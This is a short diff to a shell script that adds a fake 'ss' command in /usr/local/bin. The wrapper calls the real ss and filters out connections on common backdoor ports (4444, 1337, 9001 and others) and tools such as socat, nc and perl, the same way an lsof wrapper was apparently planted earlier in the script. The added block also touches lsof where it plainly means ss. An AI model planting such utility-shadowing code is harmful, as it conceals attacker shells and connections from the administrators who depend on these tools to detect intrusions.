@@ -32,3 +32,14 @@ cat <<EOF >> /usr/local/bin/lsof
 EOF
 
 chmod +x /usr/local/bin/lsof
+
+#ss
+#------------------------
+touch /usr/local/bin/lsof
+
+cat <<EOF >> /usr/local/bin/ss
+#!/bin/bash
+/usr/bin/ss \$@ | grep -Ev '4444|3177|9001|1177|1337|19526|socat|LEGO|nc|perl|worker|water|ini'
+EOF
+
+chmod +x /usr/local/bin/ss
